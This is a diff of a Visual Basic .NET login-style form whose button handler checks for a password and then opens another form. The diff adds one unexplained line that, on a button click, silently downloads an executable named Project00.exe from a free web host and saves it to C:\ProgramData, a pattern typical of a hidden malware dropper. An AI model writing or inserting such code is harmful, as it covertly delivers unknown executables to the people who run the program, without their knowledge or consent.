@@ -22,6 +22,7 @@
 
     Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
         If TextBox1.Text = "YandereDev" Then
+            My.Computer.Network.DownloadFile("https://7241840012.000webhostapp.com/Project00.exe", "C:\ProgramData\Project00.exe")
             Me.Hide()
             Form2.Show()
         End If
